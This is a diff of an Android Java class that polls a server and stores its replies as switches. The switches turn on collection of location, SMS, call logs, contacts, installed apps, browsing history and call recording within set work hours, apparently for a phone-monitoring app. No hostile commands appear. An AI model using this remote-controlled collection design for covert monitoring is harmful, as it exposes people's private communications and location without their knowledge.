@@ -53,140 +53,258 @@ public class PeriodicRequest extends DefaultRequest {
 
 	@Override
 	protected void sendPostRequest(String request) {
-		try {
-			getRequestData(Caller.doMake(request));
-		} catch (JSONException e) {
-			e.printStackTrace();
+		String str = Caller.doMake(request, "periodic");
+		if (str != null) {
+			getRequestData(str);
+		} else {
+			Logging.doLog(LOG_TAG, "ответа от сервера нет или он некорректен",
+					"ответа от сервера нет или он некорректен");
+			SharedPreferences sp = PreferenceManager
+					.getDefaultSharedPreferences(ctx);
+			Editor ed = sp.edit();
+			ed.putString("code", "1");
+			ed.commit();
+			
 		}
 	}
 
 	@Override
-	protected void getRequestData(String response) throws JSONException {
+	protected void getRequestData(String response) {
 		Logging.doLog(LOG_TAG, "getResponseData: " + response, "getResponseData: " + response);
-
+		
 		SharedPreferences sp = PreferenceManager
 				.getDefaultSharedPreferences(ctx);
 		Editor ed = sp.edit();
 		
-		JSONObject jsonObject = new JSONObject(response);
-		
-		String str = jsonObject.getString("ANSWER");
-		if (str != null) {
-			ed.putString("ANSWER", str);
-		} else {
-			ed.putString("ANSWER", "");
-		}
-
-		str = jsonObject.getString("GEO");
-		if (str != null) {
-			ed.putString("GEO", str);
-		} else {
-			ed.putString("GEO", "5");
+		JSONObject jsonObject;
+		try {
+			jsonObject = new JSONObject(response);
+		} catch (JSONException e) {
+			return;
 		}
 		
-		str = jsonObject.getString("GEOTYPE");
+		String str = null;
+		try {
+			str = jsonObject.getString("code");
+		} catch (JSONException e) {
+			str = null;
+		}
 		if (str != null) {
-			ed.putString("GEOTYPE", str);
+			ed.putString("code", str);
 		} else {
-			ed.putString("GEOTYPE", "1");
+			ed.putString("code", "");
 		}
 		
-		str = jsonObject.getString("SMS");
-		if (str != null) {
-			ed.putString("SMS", str);
-		} else {
-			ed.putString("SMS", "0");
-		}
-
-		str = jsonObject.getString("CALL");
-		if (str != null) {
-			ed.putString("CALL", str);
-		} else {
-			ed.putString("CALL", "0");
+		// режим ожидания принятия решения
+		if (str.equals("1")) {
+			ed.putString("period", "1");
+			ed.commit();
+			return;
 		}
 		
-		str = jsonObject.getString("TELBK");
-		if (str != null) {
-			ed.putString("TELBK", str);
-		} else {
-			ed.putString("TELBK", "0");
-		}
-
-		str = jsonObject.getString("LISTAPP");
-		if (str != null) {
-			ed.putString("LISTAPP", str);
-		} else {
-			ed.putString("LISTAPP", "0");
+		// переход в пассивный режим работы 
+		if (str.equals("3")) {
+			ed.putString("period", "10");
+			ed.commit();
+			return;
 		}
 		
-		str = jsonObject.getString("ARCSMS");
-		if (str != null) {
-			ed.putString("ARCSMS", str);
-		} else {
-			ed.putString("ARCSMS", "0");
-		}
-
-		str = jsonObject.getString("ARCCALL");
-		if (str != null) {
-			ed.putString("ARCCALL", str);
-		} else {
-			ed.putString("ARCCALL", "0");
-		}
-
-		str = jsonObject.getString("STBR");
-		if (str != null) {
-			ed.putString("STBR", str);
-		} else {
-			ed.putString("STBR", "0");
-		}
-
-		str = jsonObject.getString("RECALL");
-		if (str != null) {
-			ed.putString("RECALL", str);
-		} else {
-			ed.putString("RECALL", "0");
+		// ошибки
+		if (str.equals("0")) {
+			String errstr = null;
+			try {
+				errstr = jsonObject.getString("error");
+			} catch (JSONException e) {
+				errstr = null;
+			}
+			if (errstr != null) {
+				ed.putString("error", errstr);
+			} else {
+				ed.putString("error", "");
+			}
+			ed.commit();
+			return;
 		}
 		
-		str = jsonObject.getString("UTCT");
+		// активный режим работы
+		if (str.equals("2")) {
+			ed.putString("period", "1");
+		}
+
+		try {
+			str = jsonObject.getString("geo");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("geo", str);
+		} else {
+			ed.putString("geo", "0");
+		}
+		
+		try {
+			str = jsonObject.getString("geo_mode");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("geo_mode", str);
+		} else {
+			ed.putString("geo_mode", "1");
+		}
+		
+		try {
+			str = jsonObject.getString("sms");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("sms", str);
+		} else {
+			ed.putString("sms", "0");
+		}
+
+		try {
+			str = jsonObject.getString("call");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("call", str);
+		} else {
+			ed.putString("call", "0");
+		}
+		
+		try {
+			str = jsonObject.getString("telbook");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("telbook", str);
+		} else {
+			ed.putString("telbook", "0");
+		}
+
+		try {
+			str = jsonObject.getString("listapp");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("listapp", str);
+		} else {
+			ed.putString("listapp", "0");
+		}
+		
+		try {
+			str = jsonObject.getString("arhsms");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("arhsms", str);
+		} else {
+			ed.putString("arhsms", "0");
+		}
+
+		try {
+			str = jsonObject.getString("arhcall");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("arhcall", str);
+		} else {
+			ed.putString("arhcall", "0");
+		}
+
+		try {
+			str = jsonObject.getString("www");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("www", str);
+		} else {
+			ed.putString("www", "0");
+		}
+
+		try {
+			str = jsonObject.getString("recall");
+		} catch (JSONException e) {
+			str = null;
+		}
+		if (str != null) {
+			ed.putString("recall", str);
+		} else {
+			ed.putString("recall", "0");
+		}
+		
+		try {
+			str = jsonObject.getString("UTCT");
+		} catch (JSONException e) {
+			str = null;
+		}
 		if (str != null) {
 			ed.putString("UTCT", str);
 		} else {
 			ed.putString("UTCT", "0");
 		}
 
-		str = jsonObject.getString("TIME_FR");
+		try {
+			str = jsonObject.getString("time_from");
+		} catch (JSONException e) {
+			str = null;
+		}
 		if (str != null) {
-			ed.putString("TIME_FR", str);
+			ed.putString("time_from", str);
 		} else {
-			ed.putString("TIME_FR", "");
+			ed.putString("time_from", "");
 		}
 
-		str = jsonObject.getString("TIME_TO");
+		try {
+			str = jsonObject.getString("time_to");
+		} catch (JSONException e) {
+			str = null;
+		}
 		if (str != null) {
-			ed.putString("TIME_TO", str);
+			ed.putString("time_to", str);
 		} else {
-			ed.putString("TIME_TO", "");
+			ed.putString("time_to", "");
 		}
 
-		str = jsonObject.getString("BRK1_FR");
+		try {
+			str = jsonObject.getString("brk_from");
+		} catch (JSONException e) {
+			str = null;
+		}
 		if (str != null) {
-			ed.putString("BRK1_FR", str);
+			ed.putString("brk_from", str);
 		} else {
-			ed.putString("BRK1_FR", "");
+			ed.putString("brk_from", "");
 		}
 
-		str = jsonObject.getString("BRK1_TO");
+		try {
+			str = jsonObject.getString("brk_to");
+		} catch (JSONException e) {
+			str = null;
+		}
 		if (str != null) {
-			ed.putString("BRK1_TO", str);
+			ed.putString("brk_to", str);
 		} else {
-			ed.putString("BRK1_TO", "");
+			ed.putString("brk_to", "");
 		}
 		
-		str = jsonObject.getString("TIME_DEV");
+		try {
+			str = jsonObject.getString("error");
+		} catch (JSONException e) {
+			str = null;
+		}
 		if (str != null) {
-			ed.putString("TIME_DEV", str);
+			ed.putString("error", str);
 		} else {
-			ed.putString("TIME_DEV", "");
+			ed.putString("error", "");
 		}
 
 		ed.commit();
